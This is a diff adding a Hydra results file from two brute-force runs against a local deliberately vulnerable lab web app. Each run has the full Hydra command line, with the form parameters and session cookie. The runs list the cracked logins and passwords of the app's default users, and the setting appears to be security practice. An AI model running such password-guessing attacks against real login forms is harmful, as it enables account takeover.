@@ -1,0 +1,12 @@
+# Hydra v9.7 run at 2026-10-01 22:24:03 on 127.0.0.1 http-get-form (hydra -L usuarios.txt -P passwords.txt -s 4280 -t 1 -V -o resultados_hydra.txt 127.0.0.1 http-get-form /vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=5d4e5e048da36b6e81d8cdf2216f6994:S=Welcome to the password protected area)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+[4280][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[4280][http-get-form] host: 127.0.0.1   login: 1337   password: charley
+[4280][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+[4280][http-get-form] host: 127.0.0.1   login: smithy   password: password
+# Hydra v9.7 run at 2026-10-01 22:48:06 on 127.0.0.1 http-get-form (hydra -L usuarios.txt -P passwords.txt -s 4280 -t 1 -V -o resultados_hydra.txt 127.0.0.1 http-get-form /vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=5d4e5e048da36b6e81d8cdf2216f6994:S=Welcome to the password protected area)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+[4280][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[4280][http-get-form] host: 127.0.0.1   login: 1337   password: charley
+[4280][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+[4280][http-get-form] host: 127.0.0.1   login: smithy   password: password
